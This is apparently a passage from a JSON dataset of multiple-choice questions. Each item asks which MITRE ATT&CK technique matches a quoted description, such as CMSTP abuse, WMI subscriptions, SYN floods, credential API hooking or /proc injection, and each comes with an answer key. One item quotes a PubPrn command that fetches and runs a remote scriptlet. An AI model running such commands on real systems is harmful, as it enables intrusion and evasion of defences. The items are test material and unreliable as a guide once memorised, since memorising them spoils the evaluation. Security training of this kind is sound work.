        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles.  CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.\n\nAdversaries may supply CMSTP.exe with INF files infected with malicious commands.  Similar to Regsvr32 / \u201dSquiblydoo\u201d, CMSTP.exe may be abused to load and execute DLLs   and/or COM scriptlets (SCT) from remote servers.    This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.\n\nCMSTP.exe can also be abused to Bypass User Account Control and execute arbitrary commands from a malicious INF through an auto-elevated COM interface.\nA. Virtualization/Sandbox Evasion: User Activity Based Checks, B. Event Triggered Execution: Component Object Model Hijacking, C. System Binary Proxy Execution: CMSTP, D. Endpoint Denial of Service: Application or System Exploitation\nAnswer:",
    "context": "",
    "output": "C. System Binary Proxy Execution: CMSTP",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles.  CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.\n\nAdversaries may supply CMSTP.exe with INF files infected with malicious commands.  Similar to Regsvr32 / \u201dSquiblydoo\u201d, CMSTP.exe may be abused to load and execute DLLs   and/or COM scriptlets (SCT) from remote servers.    This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.\n\nCMSTP.exe can also be abused to Bypass User Account Control and execute arbitrary commands from a malicious INF through an auto-elevated COM interface.",
      "options": "A. Virtualization/Sandbox Evasion: User Activity Based Checks, B. Event Triggered Execution: Component Object Model Hijacking, C. System Binary Proxy Execution: CMSTP, D. Endpoint Denial of Service: Application or System Exploitation",
      "choice": "C. System Binary Proxy Execution: CMSTP",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user login, or the computer's uptime.\n\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. Adversaries may also compile WMI scripts \u2013 using `mofcomp.exe`  \u2013into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.\n\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.\n\nPossible answers:\nA. Forced Authentication, B. System Binary Proxy Execution: Msiexec, C. Event Triggered Execution: Windows Management Instrumentation Event Subscription, D. Subvert Trust Controls: Install Root Certificate",
    "context": "",
    "output": "C. Event Triggered Execution: Windows Management Instrumentation Event Subscription",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user login, or the computer's uptime.\n\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. Adversaries may also compile WMI scripts \u2013 using `mofcomp.exe`  \u2013into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.\n\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.",
      "options": "A. Forced Authentication, B. System Binary Proxy Execution: Msiexec, C. Event Triggered Execution: Windows Management Instrumentation Event Subscription, D. Subvert Trust Controls: Install Root Certificate",
      "choice": "C. Event Triggered Execution: Windows Management Instrumentation Event Subscription",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods. With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.\n\nOptions:\nA. Endpoint Denial of Service: OS Exhaustion Flood, B. Boot or Logon Autostart Execution: XDG Autostart Entries, C. Web Service, D. Ingress Tool Transfer",
    "context": "",
    "output": "A. Endpoint Denial of Service: OS Exhaustion Flood",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods. With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.",
      "options": "A. Endpoint Denial of Service: OS Exhaustion Flood, B. Boot or Logon Autostart Execution: XDG Autostart Entries, C. Web Service, D. Ingress Tool Transfer",
      "choice": "A. Endpoint Denial of Service: OS Exhaustion Flood",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials. Unlike Keylogging,  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:\n\n* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.\n* **Import address table (IAT) hooking**, which use modifications to a process\u2019s IAT, where pointers to imported API functions are stored.\n* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.\n\nPossible answers:\nA. Command and Scripting Interpreter: Visual Basic, B. Office Application Startup: Outlook Forms, C. Unsecured Credentials: Container API, D. Input Capture: Credential API Hooking",
    "context": "",
    "output": "D. Input Capture: Credential API Hooking",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials. Unlike Keylogging,  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:\n\n* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.\n* **Import address table (IAT) hooking**, which use modifications to a process\u2019s IAT, where pointers to imported API functions are stored.\n* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.",
      "options": "A. Command and Scripting Interpreter: Visual Basic, B. Office Application Startup: Outlook Forms, C. Unsecured Credentials: Container API, D. Input Capture: Credential API Hooking",
      "choice": "D. Input Capture: Credential API Hooking",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.  \n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.\nA. Supply Chain Compromise: Compromise Software Dependencies and Development Tools, B. Obtain Capabilities: Artificial Intelligence, C. Account Manipulation: Device Registration, D. Pre-OS Boot: System Firmware",
    "context": "",
    "output": "A. Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.  \n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.",
      "options": "A. Supply Chain Compromise: Compromise Software Dependencies and Development Tools, B. Obtain Capabilities: Artificial Intelligence, C. Account Manipulation: Device Registration, D. Pre-OS Boot: System Firmware",
      "choice": "A. Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.\n\nOnce malicious rules have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.\nA. Office Application Startup: Outlook Rules, B. Data from Network Shared Drive, C. Data from Information Repositories: Confluence, D. User Execution: Malicious File\nAnswer:",
    "context": "",
    "output": "A. Office Application Startup: Outlook Rules",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.\n\nOnce malicious rules have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.",
      "options": "A. Office Application Startup: Outlook Rules, B. Data from Network Shared Drive, C. Data from Information Repositories: Confluence, D. User Execution: Malicious File",
      "choice": "A. Office Application Startup: Outlook Rules",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the Windows Command Shell via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.\n\nAdversaries may abuse PubPrn to execute malicious payloads hosted on remote sites. To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.\n\nIn later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).\n\nA. System Binary Proxy Execution: Mavinject, B. Boot or Logon Initialization Scripts: Logon Script (Windows), C. System Script Proxy Execution: PubPrn, D. Account Manipulation: Device Registration\nA:",
    "context": "",
    "output": "C. System Script Proxy Execution: PubPrn",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the Windows Command Shell via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.\n\nAdversaries may abuse PubPrn to execute malicious payloads hosted on remote sites. To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.\n\nIn later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).",
      "options": "A. System Binary Proxy Execution: Mavinject, B. Boot or Logon Initialization Scripts: Logon Script (Windows), C. System Script Proxy Execution: PubPrn, D. Account Manipulation: Device Registration",
      "choice": "C. System Script Proxy Execution: PubPrn",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes).\n\nAdversaries may craft various search engine queries depending on what information they seek to gather. Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages/leaks of sensitive information such as network details or credentials. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Valid Accounts or Phishing).\nA. Search Open Websites/Domains: Search Engines, B. Network Denial of Service: Direct Network Flood, C. Steal or Forge Authentication Certificates, D. Encrypted Channel: Symmetric Cryptography",
    "context": "",
    "output": "A. Search Open Websites/Domains: Search Engines",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes).\n\nAdversaries may craft various search engine queries depending on what information they seek to gather. Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages/leaks of sensitive information such as network details or credentials. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Valid Accounts or Phishing).",
      "options": "A. Search Open Websites/Domains: Search Engines, B. Network Denial of Service: Direct Network Flood, C. Steal or Forge Authentication Certificates, D. Encrypted Channel: Symmetric Cryptography",
      "choice": "A. Search Open Websites/Domains: Search Engines",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts. Adversaries may also subsequently log off and/or perform a System Shutdown/Reboot to set malicious changes into place.\n\nIn Windows, Net utility, <code>Set-LocalUser</code> and <code>Set-ADAccountPassword</code> PowerShell cmdlets may be used by adversaries to modify user accounts. In Linux, the <code>passwd</code> utility may be used to change passwords. Accounts could also be disabled by Group Policy. \n\nAdversaries who use ransomware or similar attacks may first perform this and other Impact behaviors, such as Data Destruction and Defacement, in order to impede incident response/recovery before completing the Data Encrypted for Impact objective.\nA. Account Access Removal, B. Rootkit, C. Windows Management Instrumentation, D. Hijack Execution Flow: COR_PROFILER\nAnswer:",
    "context": "",
    "output": "A. Account Access Removal",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts. Adversaries may also subsequently log off and/or perform a System Shutdown/Reboot to set malicious changes into place.\n\nIn Windows, Net utility, <code>Set-LocalUser</code> and <code>Set-ADAccountPassword</code> PowerShell cmdlets may be used by adversaries to modify user accounts. In Linux, the <code>passwd</code> utility may be used to change passwords. Accounts could also be disabled by Group Policy. \n\nAdversaries who use ransomware or similar attacks may first perform this and other Impact behaviors, such as Data Destruction and Defacement, in order to impede incident response/recovery before completing the Data Encrypted for Impact objective.",
      "options": "A. Account Access Removal, B. Rootkit, C. Windows Management Instrumentation, D. Hijack Execution Flow: COR_PROFILER",
      "choice": "A. Account Access Removal",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table. The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. Disk Structure Wipe may be performed in isolation, or along with Disk Content Wipe if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using Network Device CLI commands such as `format`.\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.\n\nOptions:\nA. Disk Wipe: Disk Structure Wipe, B. System Binary Proxy Execution: Regsvcs/Regasm, C. System Location Discovery, D. Search Open Websites/Domains: Social Media",
    "context": "",
    "output": "A. Disk Wipe: Disk Structure Wipe",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table. The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. Disk Structure Wipe may be performed in isolation, or along with Disk Content Wipe if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using Network Device CLI commands such as `format`.\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.",
      "options": "A. Disk Wipe: Disk Structure Wipe, B. System Binary Proxy Execution: Regsvcs/Regasm, C. System Location Discovery, D. Search Open Websites/Domains: Social Media",
      "choice": "A. Disk Wipe: Disk Structure Wipe",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. \n\nProc memory injection involves enumerating the memory of a process via the /proc filesystem (<code>/proc/pid</code>) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes\u2019 stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes\u2019 memory map within <code>/proc/pid/maps</code> can be overwritten using dd. \n\nOther techniques such as Dynamic Linker Hijacking may be used to populate a target process with more available gadgets. Similar to Process Hollowing, proc memory injection may target child processes (such as a backgrounded copy of sleep). \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process.\nA. Data from Network Shared Drive, B. Unsecured Credentials: Private Keys, C. Process Injection: Proc Memory, D. Access Token Manipulation: Token Impersonation/Theft\nAnswer:",
    "context": "",
    "output": "C. Process Injection: Proc Memory",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. \n\nProc memory injection involves enumerating the memory of a process via the /proc filesystem (<code>/proc/pid</code>) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes\u2019 stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes\u2019 memory map within <code>/proc/pid/maps</code> can be overwritten using dd. \n\nOther techniques such as Dynamic Linker Hijacking may be used to populate a target process with more available gadgets. Similar to Process Hollowing, proc memory injection may target child processes (such as a backgrounded copy of sleep). \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process.",
      "options": "A. Data from Network Shared Drive, B. Unsecured Credentials: Private Keys, C. Process Injection: Proc Memory, D. Access Token Manipulation: Token Impersonation/Theft",
      "choice": "C. Process Injection: Proc Memory",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.\n\nAdversaries use launchctl to execute commands and programs as Launch Agents or Launch Daemons. Common subcommands include: <code>launchctl load</code>,<code>launchctl unload</code>, and <code>launchctl start</code>. Adversaries can use scripts or manually run the commands <code>launchctl load -w \"%s/Library/LaunchAgents/%s\"</code> or <code>/bin/launchctl load</code> to execute Launch Agents or Launch Daemons.\n\nA. System Services: Launchctl, B. Lateral Tool Transfer, C. Modify Authentication Process: Reversible Encryption, D. Server Software Component: SQL Stored Procedures\nAnswer:",
    "context": "",
    "output": "A. System Services: Launchctl",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.\n\nAdversaries use launchctl to execute commands and programs as Launch Agents or Launch Daemons. Common subcommands include: <code>launchctl load</code>,<code>launchctl unload</code>, and <code>launchctl start</code>. Adversaries can use scripts or manually run the commands <code>launchctl load -w \"%s/Library/LaunchAgents/%s\"</code> or <code>/bin/launchctl load</code> to execute Launch Agents or Launch Daemons.",
      "options": "A. System Services: Launchctl, B. Lateral Tool Transfer, C. Modify Authentication Process: Reversible Encryption, D. Server Software Component: SQL Stored Procedures",
      "choice": "A. System Services: Launchctl",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.\nA. Container and Resource Discovery, B. Acquire Infrastructure, C. Exfiltration Over Physical Medium: Exfiltration over USB, D. Brute Force: Password Guessing",
    "context": "",
    "output": "C. Exfiltration Over Physical Medium: Exfiltration over USB",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",
      "options": "A. Container and Resource Discovery, B. Acquire Infrastructure, C. Exfiltration Over Physical Medium: Exfiltration over USB, D. Brute Force: Password Guessing",
      "choice": "C. Exfiltration Over Physical Medium: Exfiltration over USB",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.\n\nPossible answers:\nA. Permission Groups Discovery, B. Masquerading: Masquerade Task or Service, C. Remote Services: Distributed Component Object Model, D. Active Scanning",
    "context": "",
    "output": "B. Masquerading: Masquerade Task or Service",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.",
      "options": "A. Permission Groups Discovery, B. Masquerading: Masquerade Task or Service, C. Remote Services: Distributed Component Object Model, D. Active Scanning",
      "choice": "B. Masquerading: Masquerade Task or Service",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Unix Shell Configuration Modification or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.\nA. Reflective Code Loading, B. File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification, C. Unsecured Credentials: Bash History, D. Group Policy Discovery",
    "context": "",
    "output": "B. File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Unix Shell Configuration Modification or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.",
      "options": "A. Reflective Code Loading, B. File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification, C. Unsecured Credentials: Bash History, D. Group Policy Discovery",
      "choice": "B. File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
